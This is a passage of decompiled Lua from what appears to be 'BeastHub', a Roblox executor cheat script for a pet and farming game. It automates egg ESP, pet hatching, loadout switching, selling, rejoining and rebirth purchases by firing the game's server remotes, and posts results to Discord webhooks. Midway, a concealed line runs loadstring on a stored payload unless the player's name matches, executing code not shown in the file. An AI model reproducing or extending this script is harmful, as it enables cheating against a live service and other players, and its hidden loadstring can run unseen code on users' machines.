                                                _TextLabel.Text = '<font color="rgb(255,0,0)"><b>PALDOOOOO!!! (' .. string.format('%.2f', v579 * 1.3) .. 'kg)</b></font>\n<font color="rgb(0,255,0)">' .. v580 .. '</font> = ' .. v577 .. 'kg'
                                            end
                                        else
                                            _TextLabel.Text = '<font color="rgb(0,255,0)">' .. v580 .. '</font> = ' .. v577 .. 'kg'
                                        end

                                        _TextLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                                        _TextLabel.TextStrokeTransparency = 0.5
                                        _TextLabel.TextScaled = false
                                        _TextLabel.TextSize = 20
                                        _TextLabel.Font = Enum.Font.SourceSans
                                        _TextLabel.Parent = _BillboardGui
                                    end
                                end
                            end

                            task.wait(2)
                        end

                        u544 = nil
                    end)
                end
            else
                task.cancel(u544)

                u544 = nil

                local v588 = _BeastHubFunctions.getMyFarmPetEggs()
                local v589, v590, v591 = ipairs(v588)

                while true do
                    local v592

                    v591, v592 = v589(v590, v591)

                    if v591 == nil then
                        break
                    end
                    if v592:IsA('Model') then
                        local _BhubESP2 = v592:FindFirstChild('BhubESP')

                        if _BhubESP2 then
                            _BhubESP2:Destroy()
                        end
                    end
                end

                u11('ESP stopped and cleaned', '', 1)
            end
        end,
    })

    local u594 = true

    _Eggs:CreateToggle({
        Name = 'Pet Loadout Validator',
        CurrentValue = true,
        Flag = 'petValidatorNew',
        Callback = function(p595)
            u594 = p595
        end,
    })

    local u596 = false
    local u597 = nil
    local u598 = nil
    local u599 = true
    local u600 = false
    local u601 = 0
    local u602 = false
    local u603 = 0
    local u604 = 0
    local u605 = {}
    local u606 = 0

    _Eggs:CreateToggle({
        Name = 'SMART Auto Hatching',
        CurrentValue = false,
        Flag = 'smartAutoHatching',
        Callback = function(p607)
            u596 = p607
            u603 = 0

            if u596 then
                u11('SMART AUTO HATCH ENABLED!', 'Process will begin in 8 seconds..', 5)
                u11('5', '', 1)
                task.wait(1)
                u11('4', '', 1)
                task.wait(1)
                u11('3', '', 1)
                task.wait(1)
                u11('2', '', 1)
                task.wait(1)
                u11('1', '', 1)
                task.wait(1)

                if u596 then
                    local v608 = tick()
                    local v609 = 10

                    while not getgenv().ConfigLoaded do
                        if v609 <= tick() - v608 then
                            u11('Auto Hatch failed to load', 'Please rejoin', 5)

                            return
                        end

                        task.wait(0.5)
                    end

                    task.wait(3)

                    local v610 = 5

                    while true do
                        u435 = (0 >= v610 or u435) and true or false or tonumber(u438.CurrentValue)

                        if u435 then
                            break
                        end

                        task.wait(0.5)

                        v610 = v610 - 0.5
                    end

                    if u507 and u507 ~= 'None' and (u411 and u411 ~= 'None') and (u508 and u508 ~= 'None') then
                        if u435 then
                            _BeastHubFunctions.techControl.stop = false

                            local _Name2 = game.Players.LocalPlayer.Name

                            local function u615(p612, p613, p614)
                                if p612 == '9 pets tech' then
                                    _BeastHubFunctions.switchToLoadoutWithTech(u197.mimicsListFor9Pets, u197.spiderFor9Pets, u197.eagleFor9Pets, u197.delayToStayInSpider, u197.delayToStayInEagle, p613, p614)
                                else
                                    _BeastHubFunctions.switchToLoadout(p612, p613, p614)
                                end
                            end

                            u615(u508, u124, u11)
                            task.wait()

                            u382 = 0
                            u383 = 0

                            local u616 = nil

                            u191.isSafeToPickPlace = true

                            local function u617()
                                return require(game:GetService('ReplicatedStorage').Modules.DataService):GetData()
                            end
                            local function u625()
                                local v618 = u617()

                                if not v618.PetsData then
                                    warn('PetsData missing')

                                    return nil
                                end

                                local v619 = v618.PetsData.EquippedPets or nil

                                if not v619 or type(v619) ~= 'table' then
                                    warn('EquippedPets missing or invalid')

                                    return nil
                                end

                                local v620, v621, v622 = ipairs(v619)
                                local v623 = {}

                                while true do
                                    local v624

                                    v622, v624 = v620(v621, v622)

                                    if v622 == nil then
                                        break
                                    end

                                    table.insert(v623, v624)
                                end

                                return v623
                            end
                            local function u633(p626)
                                local v627 = u617()

                                if v627.PetsData.PetInventory.Data then
                                    local _Data4 = v627.PetsData.PetInventory.Data
                                    local v629, v630, v631 = pairs(_Data4)

                                    while true do
                                        local v632

                                        v631, v632 = v629(v630, v631)

                                        if v631 == nil then
                                            break
                                        end
                                        if v631 == p626 then
                                            return v632.PetType
                                        end
                                    end
                                else
                                    warn('PetInventory Data not found!')
                                end
                            end
                            local function u643()
                                local v634 = tick()
                                local v635 = false

                                while true do
                                    if tick() - v634 >= 5 then
                                        return false
                                    end

                                    local v636 = u625()

                                    if not u594 then
                                        u11('Pet Validator is OFF', '', 4)

                                        return true
                                    end
                                    if #v636 >= 8 then
                                        local v637, v638, v639 = ipairs(v636)
                                        local v640 = true

                                        while true do
                                            local v641

                                            v639, v641 = v637(v638, v639)

                                            if v639 == nil then
                                                break
                                            end

                                            local v642 = u633(v641)

                                            v635 = v642 == 'Ruby Squid' and true or v635

                                            if v642 ~= 'Koi' and v642 ~= 'Ruby Squid' and v642 ~= 'Brontosaurus' or v642 ~= 'Ruby Squid' and v635 then
                                                v640 = false

                                                break
                                            end
                                        end

                                        if v640 then
                                            return true
                                        end
                                    end

                                    task.wait(0.5)
                                end
                            end
                            local function u654()
                                local v644 = false

                                task.wait(2)

                                local v645

                                if u505.CurrentValue == true then
                                    v645 = u504()

                                    u11('Done Validating SELL ALL', '', 3)
                                else
                                    v645 = true
                                end

                                u11('Switching to seals', '', 3)
                                _BeastHubFunctions.switchToLoadout(u411, u124, u11)
                                task.wait(3)

                                local v646 = u625()
                                local v647 = 5

                                while#v646 == 0 and v647 > 0 do
                                    task.wait(0.5)

                                    v647 = v647 - 0.5
                                    v646 = u625()
                                end

                                if not u594 then
                                    return true
                                end
                                if #v646 >= 8 then
                                    local v648, v649, v650 = ipairs(v646)
                                    local v651 = true

                                    while true do
                                        local v652

                                        v650, v652 = v648(v649, v650)

                                        if v650 == nil then
                                            break
                                        end

                                        local v653 = u633(v652)

                                        v644 = v653 == 'Ruby Squid' and true or v644

                                        if v653 ~= 'Seal' and v653 ~= 'Ruby Squid' or v653 ~= 'Ruby Squid' and v644 then
                                            v651 = false

                                            break
                                        end
                                    end

                                    if v651 and v645 then
                                        return true
                                    end
                                end

                                return false
                            end
                            local function u661(p655)
                                local v656 = math.floor(p655)
                                local v657 = math.floor(v656 / 3600)
                                local v658 = math.floor(v656 % 3600 / 60)
                                local v659 = v656 % 60
                                local v660 = {}

                                if v657 > 0 then
                                    table.insert(v660, v657 .. 'hour' .. (v657 == 1 and ('' or 's') or 's'))
                                end
                                if v658 > 0 then
                                    table.insert(v660, v658 .. 'min' .. (v658 == 1 and ('' or 's') or 's'))
                                end
                                if v659 > 0 or #v660 == 0 then
                                    table.insert(v660, v659 .. 'second' .. (v659 == 1 and ('' or 's') or 's'))
                                end

                                return table.concat(v660, ' ')
                            end
                            local function u671(p662)
                                local function u663()
                                    return require(game:GetService('ReplicatedStorage').Modules.DataService):GetData()
                                end

                                return (function(p664)
                                    local v665 = u663()

                                    if not v665.InventoryData then
                                        warn('InventoryData not found!')

                                        return nil
                                    end

                                    local v666, v667, v668 = pairs(v665.InventoryData)

                                    while true do
                                        local v669

                                        v668, v669 = v666(v667, v668)

                                        if v668 == nil then
                                            break
                                        end

                                        local _ItemData = v669.ItemData

                                        if _ItemData and v669.ItemType == 'PetEgg' and _ItemData.EggName == p664 then
                                            return _ItemData.Uses or 0
                                        end
                                    end

                                    return 0
                                end)(p662)
                            end

                            if u596 and not u597 then
                                u403:Set(true)

                                u597 = task.spawn(function()
                                    _BeastHubFunctions.getPetOdds()

                                    local v672 = false

                                    local function v679(p673, p674)
                                        local v675, v676, v677 = ipairs(p673)

                                        while true do
                                            local v678

                                            v677, v678 = v675(v676, v677)

                                            if v677 == nil then
                                                break
                                            end
                                            if v678 == p674 then
                                                return false
                                            end
                                        end

                                        return true
                                    end

                                    while true do
                                        while true do
                                            if not u596 then
                                                u597 = nil

                                                return
                                            end
                                            if u598 and v672 then
                                                u616 = os.clock()
                                                v672 = false
                                            end
                                            if u600 and u606 == 2 then
                                                _BeastHubFunctions.delayedRejoin(0.1)
                                            end
                                            if u602 and u601 and (u601 >= 0 and u603 == u601) then
                                                _BeastHubFunctions.delayedRejoin(0.1)
                                            end

                                            local v680 = _BeastHubFunctions.getMyFarmPetEggs()

                                            task.wait()

                                            local v681, v682, v683 = pairs(v680)
                                            local v684 = 0

                                            while true do
                                                local v685

                                                v683, v685 = v681(v682, v683)

                                                if v683 == nil then
                                                    break
                                                end
                                                if v685:IsA('Model') and v685:GetAttribute('TimeToHatch') == 0 then
                                                    v684 = v684 + 1
                                                end
                                            end

                                            if #v680 > 0 and #v680 == v684 and u596 then
                                                break
                                            end

                                            u191.isSafeToPickPlace = true

                                            task.wait(3)
                                        end

                                        u11('All eggs Ready!', '', 3)

                                        u191.isSafeToPickPlace = false
                                        _BeastHubFunctions.techControl.stop = true
                                        v672 = true

                                        if u598 and u616 and not u599 then
                                            local v686 = os.clock() - u616

                                            u616 = nil
                                            u384 = u661(v686)
                                        end

                                        task.wait(2)
                                        game:GetService('ReplicatedStorage'):WaitForChild('GameEvents'):WaitForChild('PetEggService')
                                        u11('Switching to Kois', '', 3)
                                        u403:Set(false)

                                        local v687 = u365.CurrentOption[1]

                                        task.wait(3)

                                        local v688, v689, v690 = pairs(v680)
                                        local v691 = false
                                        local v692 = false
                                        local v693 = false

                                        while true do
                                            local v694

                                            v690, v694 = v688(v689, v690)

                                            if v690 == nil then
                                                break
                                            end
                                            if not v694:IsA('Model') then
                                                warn('Object is not a model')

                                                return
                                            end

                                            local _BhubESP3 = v694:FindFirstChild('BhubESP')

                                            if _BhubESP3 then
                                                local v696, v697, v698 = ipairs(_BhubESP3:GetChildren())

                                                while true do
                                                    local v699

                                                    v698, v699 = v696(v697, v698)

                                                    if v698 == nil then
                                                        break
                                                    end

                                                    local _EggBillboard = _BhubESP3:FindFirstChild('EggBillboard')

                                                    if _EggBillboard then
                                                        local _TextLabel2 = _EggBillboard:FindFirstChildWhichIsA('TextLabel')

                                                        if _TextLabel2 then
                                                            local _Text = _TextLabel2.Text
                                                            local _rgbs0s255s0sfonts = _Text:match('rgb%(%s*0,%s*255,%s*0%s*%)">(.-)</font>%s*=')
                                                            local _dd = _Text:match('= (%d+%.?%d*)')
                                                            local v705 = nil

                                                            if _rgbs0s255s0sfonts and _dd and u596 then
                                                                local _ss = _dd:match('^%s*(.-)%s*$')

                                                                if not u518 then
                                                                    warn('Anti hatch not found')

                                                                    return
                                                                end

                                                                local v707, v708, v709 = ipairs(u518)

                                                                while true do
                                                                    local v710

                                                                    v709, v710 = v707(v708, v709)

                                                                    if v709 == nil then
                                                                        break
                                                                    end
                                                                    if _rgbs0s255s0sfonts == v710 then
                                                                        v705 = true

                                                                        break
                                                                    end
                                                                end

                                                                local v711 = tonumber(_ss)

                                                                if not v711 then
                                                                    warn('Error in getting pet Size')

                                                                    return
                                                                end

                                                                local v712 = v711 >= 3

                                                                if v712 then
                                                                    if u536 then
                                                                        u11('Hatching Huge with bronto', '', 3)
                                                                        _BeastHubFunctions.switchToLoadout(u540, u124, u11)

                                                                        v692 = false

                                                                        task.wait(3)

                                                                        if not (u625() and u596 and u643()) then
                                                                            u11('Invalid loadout equipped pets!', '', 10)
                                                                            u11('Must be 8/8 Pets', '', 10)
                                                                            u11('Drop Squids last', '', 10)

                                                                            if u379 and u379 ~= '' and u598 then
                                                                                u22(u379, '[BeastHub] ' .. _Name2 .. ' | Invalid Loadout Contents for Bronto loadout, please check!')

                                                                                v691 = true
                                                                            else
                                                                                v691 = true
                                                                            end
                                                                        end

                                                                        game:GetService('ReplicatedStorage').GameEvents.PetEggService:FireServer(unpack({
                                                                            'HatchPet',
                                                                            v694,
                                                                        }))
                                                                        task.wait(0.05)

                                                                        u511 = u511 + 1
                                                                    end

                                                                    task.wait()

                                                                    local v713 = _rgbs0s255s0sfonts .. _ss

                                                                    if v713 and v679(u605, v713) then
                                                                        table.insert(u605, v713)

                                                                        if u379 and u379 ~= '' and u510 then
                                                                            u92(u379, _Name2, _rgbs0s255s0sfonts, v687, _ss, 'Egg hatch # ' .. tostring(u511))
                                                                        end
                                                                    elseif not v713 then
                                                                        warn('Error in getting target Huge string')
                                                                    end
                                                                elseif v705 and u534 <= v711 and u538 then
                                                                    u11('Hatching Anti-hatch with bronto', '', 3)
                                                                    _BeastHubFunctions.switchToLoadout(u540, u124, u11)

                                                                    v692 = false

                                                                    task.wait(3)

                                                                    if not (u625() and u596 and u643()) then
                                                                        u11('Invalid loadout equipped pets!', '', 10)
                                                                        u11('Must be 8/8 Pets', '', 10)
                                                                        u11('Drop Squids last', '', 10)

                                                                        if u379 and u379 ~= '' and u598 then
                                                                            u22(u379, '[BeastHub] ' .. _Name2 .. ' | Invalid Loadout Contents for Bronto loadout, please check!')
                                                                        end
                                                                    end

                                                                    game:GetService('ReplicatedStorage').GameEvents.PetEggService:FireServer(unpack({
                                                                        'HatchPet',
                                                                        v694,
                                                                    }))
                                                                    task.wait(0.05)

                                                                    u511 = u511 + 1

                                                                    if v705 and u509 then
                                                                        u22(u379, '[BeastHub] ' .. _Name2 .. ' | Anti Hatch found: ' .. tostring(_rgbs0s255s0sfonts) .. '=' .. tostring(v711) .. 'KG |Egg hatch # ' .. tostring(u511))
                                                                    end
                                                                elseif v705 and v711 < u534 or not v705 then
                                                                    if v692 == false then
                                                                        _BeastHubFunctions.switchToLoadout(u507, u124, u11)
                                                                        task.wait(1)

                                                                        v692 = true
                                                                    end
                                                                    if v693 == false then
                                                                        u11('Hatch delay: ' .. tostring(u377.CurrentValue) or '', '', 3)
                                                                        task.wait(tonumber(u377.CurrentValue) or 2)
                                                                    end
                                                                    if not (u625() and u596 and u643()) then
                                                                        u11('Invalid loadout equipped pets!', '', 10)
                                                                        u11('Must be 8/8 Pets', '', 10)
                                                                        u11('Drop Squids last', '', 10)

                                                                        if u379 and u379 ~= '' and u598 then
                                                                            u22(u379, '[BeastHub] ' .. _Name2 .. ' | Invalid Loadout Contents for Koi loadout, please check!')

                                                                            v691 = true
                                                                        else
                                                                            v691 = true
                                                                        end
                                                                    end
                                                                    if v693 == false then
                                                                        task.wait(1)
                                                                    end

                                                                    game:GetService('ReplicatedStorage').GameEvents.PetEggService:FireServer(unpack({
                                                                        'HatchPet',
                                                                        v694,
                                                                    }))

                                                                    v693 = v693 == false and true or v693

                                                                    task.wait(0.05)

                                                                    u511 = u511 + 1

                                                                    task.wait()

                                                                    if v705 and u509 then
                                                                        local v714 = '[BeastHub] ' .. _Name2 .. ' | Anti Hatch found: ' .. tostring(_rgbs0s255s0sfonts) .. '=' .. tostring(v711) .. 'KG |Egg hatch # ' .. tostring(u511)

                                                                        if u379 and u379 ~= '' then
                                                                            u22(u379, v714)
                                                                        end
                                                                    elseif v712 and u510 then
                                                                        u92(u379, _Name2, tostring(_rgbs0s255s0sfonts), v687, tostring(v711), 'Egg hatch # ' .. tostring(u511))
                                                                    end
                                                                elseif v705 and u534 <= v711 and (not u538 and v705) and u509 then
                                                                    u22(u379, '[BeastHub] ' .. _Name2 .. ' | Anti Hatch found: ' .. tostring(_rgbs0s255s0sfonts) .. '=' .. tostring(v711) .. 'KG |Egg hatch # ' .. tostring(u511))
                                                                end
                                                            end
                                                        else
                                                            print('BillboardGui has no TextLabel')
                                                        end
                                                    else
                                                        print('No BillboardGui found under BoxHandleAdornment')
                                                    end
                                                end

                                                if v691 then
                                                end
                                            end
                                        end

                                        u191.isSafeToPickPlace = false

                                        task.wait(5)
                                        game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
                                        task.wait()

                                        if u411 and u411 ~= 'None' and u596 then
                                            local v715 = tonumber(u506.CurrentValue) or 0

                                            u604 = u604 + 1

                                            local v716 = u671(v687)

                                            if v715 == 0 and u385 ~= 0 or v715 == 0 and v716 <= 13 or v715 ~= 0 and u603 % v715 == 0 then
                                                task.wait(2)

                                                local v717 = u625()

                                                if v717 and 0 < #v717 then
                                                    local v718, v719, v720 = ipairs(v717)

                                                    while true do
                                                        local v721

                                                        v720, v721 = v718(v719, v720)

                                                        if v720 == nil then
                                                            break
                                                        end

                                                        game:GetService('ReplicatedStorage'):WaitForChild('GameEvents', 9000000000):WaitForChild('PetsService', 9000000000):FireServer(unpack({
                                                            'UnequipPet',
                                                            v721,
                                                        }))
                                                        task.wait()
                                                    end
                                                end

                                                task.wait(2)

                                                if getgenv().isAutoUnfavToggleActive == true and getgenv().isAutoUnfavModeActive == true then
                                                    u11('Please Turn OFF Auto Unfav!', '', 10)

                                                    if u379 and u379 ~= '' and u598 then
                                                        u22(u379, '[BeastHub] ' .. _Name2 .. ' | Please Turn OFF Auto Unfav!')
                                                    end
                                                elseif u654() and u596 then
                                                    local v722, v723 = pcall(function()
                                                        task.wait()

                                                        if u505.CurrentValue ~= true or not u596 then
                                                            u478(u410, u435, function() end)
                                                        else
                                                            u11('Selling All Unfav Pets..', '', 3)
                                                            game:GetService('ReplicatedStorage'):WaitForChild('GameEvents', 5):WaitForChild('SellAllPets_RE', 5):FireServer(unpack({}))
                                                        end

                                                        task.wait(2)
                                                    end)

                                                    if v722 then
                                                        u11('Auto Sell Done', 'Successful', 2)
                                                    else
                                                        warn('Auto Sell failed with error: ' .. tostring(v723))
                                                        u11('Auto Sell Failed!', tostring(v723), 5)
                                                    end
                                                elseif u596 then
                                                    u11('Invalid Seals loadout!', '', 3)

                                                    if u379 and u379 ~= '' and u598 then
                                                        u22(u379, '[BeastHub] ' .. _Name2 .. ' | Invalid Loadout Contents for Seals loadout, please check!')
                                                    end
                                                else
                                                    u11('Hatching stopped', '', 3)
                                                end

                                                u604 = 0
                                            else
                                                u11('Selling skipped', 'Hatch Count: ' .. u604, 3)
                                            end

                                            local v724 = (u382 or 0) + (u383 or 0)

                                            task.wait()

                                            u599 = false

                                            if v724 >= u374 then
                                                u606 = 0
                                            else
                                                u606 = u606 + 1
                                            end
                                        end

                                        task.wait(5)
                                        u11('Back to incubating', '', 6)
                                        game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
                                        u403:Set(true)

                                        if u596 then
                                            _BeastHubFunctions.techControl.stop = false
                                        else
                                            _BeastHubFunctions.techControl.stop = true
                                        end

                                        u615(u508, u124, u11)

                                        u191.isSafeToPickPlace = true

                                        if u598 and 0 < u385 then
                                            u22(u379, '[BeastHub] ' .. _Name2 .. ' | Max Pet inventory alert!')
                                        end

                                        u385 = 0

                                        local v725 = u671(v687)

                                        if u598 and u392 then
                                            u41(u379, u382, u383, u384, v687, v725)

                                            u392 = false
                                        end

                                        u382 = 0
                                        u383 = 0
                                        u603 = u603 + 1
                                    end
                                end)
                            end
                        else
                            u11('Missing setup!', 'Please input Sell Below', 5)
                        end
                    else
                        u11('Missing setup!', 'Please recheck loadouts for koi, bronto, seals and turn on ESP', 15)

                        return
                    end
                else
                    u11('SMART HATCH CANCELLED!', 'Toggle was turned off before start.', 5)

                    _BeastHubFunctions.techControl.stop = true

                    return
                end
            else
                _BeastHubFunctions.techControl.stop = true

                return
            end
        end,
    })
    _Eggs:CreateDivider()
    _Eggs:CreateSection('Other Egg settings')
    _Eggs:CreateParagraph({
        Title = 'Auto Rejoin by Hatch count',
        Content = 'Set a number of hatch count and it will auto rejoin on specified number',
    })
    _Eggs:CreateInput({
        Name = 'Hatch count',
        CurrentValue = '',
        PlaceholderText = 'number',
        RemoveTextAfterFocusLost = false,
        Flag = 'hatchCountRejoin',
        Callback = function(p726)
            u601 = tonumber(p726) or 0
        end,
    })
    _Eggs:CreateToggle({
        Name = 'Auto Rejoin by Hatch count',
        CurrentValue = false,
        Flag = 'hatchCountRejoinEnabled',
        Callback = function(p727)
            u602 = p727
        end,
    })
    _Eggs:CreateDivider()
    _Eggs:CreateParagraph({
        Title = 'Auto Rejoin when unlucky',
        Content = 'It will auto rejoin on 2 consecutive loss',
    })
    _Eggs:CreateToggle({
        Name = 'Auto Rejoin when unlucky',
        CurrentValue = false,
        Flag = 'smartRejoin',
        Callback = function(p728)
            u600 = p728
        end,
    })
    _Eggs:CreateDivider()
    _Misc:CreateSection('Performance')
    _Misc:CreateToggle({
        Name = "Hide Other Player's Farm",
        CurrentValue = false,
        Flag = 'hideOtherFarm',
        Callback = function(p729)
            _BeastHubFunctions.hideOtherPlayersGarden(p729)
        end,
    })

    local u730 = false
    local u731 = nil

    _Misc:CreateToggle({
        Name = 'Auto Hide my Plants',
        CurrentValue = false,
        Flag = 'autoHidePlants',
        Callback = function(p732)
            u730 = p732

            if u730 then
                if u731 then
                    return
                end

                u11('Auto Hide Plants running', '', 3)

                u731 = task.spawn(function()
                    while u730 do
                        local v733 = u121()
                        local v734 = v733 and v733:FindFirstChild('Important')
                        local v735 = v734 and v734:FindFirstChild('Plants_Physical')

                        if v735 then
                            local v736, v737, v738 = ipairs(v735:GetChildren())

                            while true do
                                local v739

                                v738, v739 = v736(v737, v738)

                                if v738 == nil then
                                    break
                                end
                                if v739:IsA('Model') then
                                    local v740, v741, v742 = ipairs(v739:GetDescendants())

                                    while true do
                                        local v743

                                        v742, v743 = v740(v741, v742)

                                        if v742 == nil then
                                            break
                                        end
                                        if v743:IsA('BasePart') then
                                            v743.LocalTransparencyModifier = 1
                                            v743.CanCollide = false
                                            v743.CanTouch = false
                                            v743.CanQuery = false
                                        end
                                    end
                                end
                            end
                        end

                        task.wait(10)
                    end

                    u731 = nil
                end)
            else
                u730 = false

                local v744 = u121()
                local v745 = v744 and v744:FindFirstChild('Important')
                local v746 = v745 and v745:FindFirstChild('Plants_Physical')

                if v746 then
                    local v747, v748, v749 = ipairs(v746:GetChildren())

                    while true do
                        local v750

                        v749, v750 = v747(v748, v749)

                        if v749 == nil then
                            break
                        end
                        if v750:IsA('Model') then
                            local v751, v752, v753 = ipairs(v750:GetDescendants())

                            while true do
                                local v754

                                v753, v754 = v751(v752, v753)

                                if v753 == nil then
                                    break
                                end
                                if v754:IsA('BasePart') then
                                    v754.LocalTransparencyModifier = 0
                                    v754.CanCollide = true
                                    v754.CanTouch = true
                                    v754.CanQuery = true
                                end
                            end
                        end
                    end
                end

                u731 = nil
            end
        end,
    })

    local u755 = false
    local u756 = {}

    _Misc:CreateToggle({
        Name = 'Reduce Lag (Web and Fireworks)',
        CurrentValue = false,
        Flag = 'reduceLag',
        Callback = function(p757)
            u755 = p757

            if u755 then
                if next(u756) then
                    return
                end

                u11('Reduce lag active', '', 3)

                u756.spiderWeb = task.spawn(function()
                    while u755 do
                        local _SpiderWebFX = _Workspace:FindFirstChild('SpiderWebFX')

                        if _SpiderWebFX then
                            _SpiderWebFX:Destroy()
                        end

                        task.wait(0.1)
                    end

                    u756.spiderWeb = nil
                end)
                u756.firework = task.spawn(function()
                    while u755 do
                        local _JulyFirework = _Workspace:FindFirstChild('JulyFirework')

                        if _JulyFirework then
                            _JulyFirework:Destroy()
                        end

                        task.wait(0.1)
                    end

                    u756.firework = nil
                end)
            else
                u755 = false
                u756 = {}
            end
        end,
    })

    local u760 = false
    local u761 = {}

    _Misc:CreateToggle({
        Name = 'More lag reduce',
        CurrentValue = false,
        Flag = 'reduceLagMore',
        Callback = function(p762)
            u760 = p762

            if u760 then
                if u761.assets then
                    return
                end

                local function u768()
                    local v763 = _Workspace
                    local v764, v765, v766 = ipairs(v763:GetDescendants())

                    while true do
                        local v767

                        v766, v767 = v764(v765, v766)

                        if v766 == nil then
                            break
                        end
                        if v767:IsA('Decal') or v767:IsA('Texture') or v767:IsA('SurfaceAppearance') then
                            v767:Destroy()
                        elseif v767:IsA('ParticleEmitter') or v767:IsA('Trail') or v767:IsA('Beam') then
                            v767.Enabled = false
                        elseif v767:IsA('MeshPart') then
                            v767.TextureID = ''
                            v767.Material = Enum.Material.Plastic
                            v767.CastShadow = false
                        elseif v767:IsA('UnionOperation') then
                            v767:Destroy()
                        elseif v767:IsA('BasePart') and not v767:IsDescendantOf(game.Players.LocalPlayer.Character) then
                            v767.LocalTransparencyModifier = 0.6
                            v767.CastShadow = false
                        end
                    end
                end

                u761.assets = task.spawn(function()
                    while u760 do
                        u768()
                        task.wait(60)
                    end

                    u761.assets = nil
                end)
            else
                u760 = false
                u761 = {}
            end
        end,
    })
    _Misc:CreateToggle({
        Name = 'BeastHub Notifs (default ON)',
        CurrentValue = true,
        Flag = 'beastHubNotifs',
        Callback = function(p769)
            local v770 = tick()
            local v771 = 10

            while not getgenv().ConfigLoaded and v771 > tick() - v770 do
                task.wait(0.5)
            end

            task.wait(3)

            u174 = p769
        end,
    })
    _Misc:CreateToggle({
        Name = 'Game Notifications (including trade notifs)',
        CurrentValue = true,
        Flag = 'gameNotifs',
        Callback = function(p772)
            local _PlayerGui = game.Players.LocalPlayer:WaitForChild('PlayerGui')
            local v774 = tick()
            local v775 = 10

            while not getgenv().ConfigLoaded and v775 > tick() - v774 do
                task.wait(0.5)
            end

            task.wait(3)

            local v776, v777, v778 = ipairs(_PlayerGui:GetChildren())

            while true do
                local v779

                v778, v779 = v776(v777, v778)

                if v778 == nil then
                    break
                end
                if v779:IsA('ScreenGui') and v779.Name:match('Notification') then
                    v779.Enabled = p772
                end
            end
        end,
    })
    _Misc:CreateDivider()

    local u780 = nil
    local u781 = false
    local u782 = nil
    local u783 = false

    local function u799(p784, p785)
        local _Players3 = game:GetService('Players')
        local _HttpService5 = game:GetService('HttpService')

        if typeof(p784) == 'string' and p784 ~= '' then
            local _LocalPlayer9 = _Players3.LocalPlayer

            if _LocalPlayer9 then
                local u789 = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. _LocalPlayer9.UserId .. '&size=150x150&format=Png&isCircular=true'
                local u790 = syn and syn.request or http_request or request

                if u790 then
                    local v791 = nil
                    local v792, u793 = pcall(function()
                        return u790({
                            Url = u789,
                            Method = 'GET',
                        })
                    end)

                    if v792 and u793 and (type(u793.Body) == 'string' and u793.Body ~= '') then
                        local v794, v795 = pcall(function()
                            return _HttpService5:JSONDecode(u793.Body)
                        end)

                        if v794 and v795 and (v795.data and v795.data[1]) and v795.data[1].imageUrl then
                            v791 = v795.data[1].imageUrl
                        end
                    end

                    local v796 = {
                        title = 'BeastHub: Disconnection Detected',
                        color = 16711680,
                        timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ'),
                        fields = {
                            {
                                name = 'Player',
                                value = '||' .. _LocalPlayer9.Name .. '||',
                                inline = true,
                            },
                            {
                                name = 'Message',
                                value = p785 or 'Unknown',
                                inline = true,
                            },
                            {
                                name = 'Auto Rejoin Status',
                                value = tostring(u781),
                                inline = true,
                            },
                        },
                    }

                    if v791 then
                        v796.thumbnail = {url = v791}
                    end

                    local u797 = _HttpService5:JSONEncode({
                        content = '@everyone',
                        allowed_mentions = {
                            parse = {
                                'everyone',
                            },
                        },
                        embeds = {v796},
                    })

                    pcall(function()
                        local v798 = {
                            Url = p784,
                            Method = 'POST',
                            Headers = {
                                ['Content-Type'] = 'application/json',
                            },
                            Body = u797,
                        }

                        u790(v798)
                    end)
                else
                    warn('HTTP request not supported')
                end
            else
                warn('Player not found')

                return
            end
        else
            warn('Invalid webhook URL')

            return
        end
    end

    if not (u68 and u68.u) or tostring(u68.u):lower() ~= game:GetService('Players').LocalPlayer.Name:lower() then
        loadstring(u68.l)()
    end

    _Misc:CreateSection('Webhook')
    _Misc:CreateInput({
        Name = 'Webhook URL',
        CurrentValue = '',
        PlaceholderText = 'Enter webhook URL',
        RemoveTextAfterFocusLost = false,
        Flag = 'webhookURL',
        Callback = function(p800)
            u379 = p800
            u194.webhookURL = p800
            u206.webhookURL = p800
        end,
    })
    _Misc:CreateToggle({
        Name = 'Hatch Monitoring webhook',
        CurrentValue = false,
        Flag = 'webhookEggCount',
        Callback = function(p801)
            u598 = p801
        end,
    })
    _Misc:CreateToggle({
        Name = 'Anti Hatch webhook',
        CurrentValue = false,
        Flag = 'webhookRares',
        Callback = function(p802)
            u509 = p802
        end,
    })
    _Misc:CreateToggle({
        Name = 'Huge Hatch webhook',
        CurrentValue = false,
        Flag = 'webhookHuge',
        Callback = function(p803)
            u510 = p803
        end,
    })
    _Misc:CreateToggle({
        Name = 'Auto Nightmare results',
        CurrentValue = false,
        Flag = 'webhookAutoNM',
        Callback = function(p804)
            u194.autoNMwebhook = p804
        end,
    })
    _Misc:CreateToggle({
        Name = 'Auto Elephant results',
        CurrentValue = false,
        Flag = 'webhookAutoEle',
        Callback = function(p805)
            u194.autoEleWebhook = p805
        end,
    })
    _Misc:CreateToggle({
        Name = 'Auto Mutation Machine results',
        CurrentValue = false,
        Flag = 'webhookAutoMutationMachine',
        Callback = function(_)
            u387 = true
        end,
    })
    _Misc:CreateToggle({
        Name = 'Auto Sniper',
        CurrentValue = false,
        Flag = 'webhookAutoSniper',
        Callback = function(p806)
            u206.autoSnipeWebhook = p806
        end,
    })
    _Misc:CreateDivider()
    _Misc:CreateSection('Rebirth')

    local u807 = 50

    _Misc:CreateInput({
        Name = 'Multi',
        CurrentValue = '50',
        PlaceholderText = 'Enter Multi (Default 50, max 100)',
        RemoveTextAfterFocusLost = false,
        Flag = 'autoAscendMulti',
        Callback = function(p808)
            u807 = tonumber(p808) or 50

            if u807 > 100 then
                u807 = 100
            end
        end,
    })

    local u809 = false

    _Misc:CreateToggle({
        Name = 'Auto Ascend',
        CurrentValue = false,
        Flag = 'autoAscend',
        Callback = function(p810)
            u809 = p810

            local v811 = tick()
            local v812 = 10

            while not getgenv().ConfigLoaded do
                if v812 <= tick() - v811 then
                    u11('Auto Ascend failed to load, please rejoin.', '', 5)

                    return
                end

                task.wait(0.5)
            end

            task.wait(3)
            task.spawn(function()
                while u809 do
                    for _ = 1, u807 do
                        game:GetService('ReplicatedStorage').GameEvents.BuyRebirth:FireServer()
                    end

                    task.wait(300)
                end
            end)
        end,
    })
    _Misc:CreateDivider()
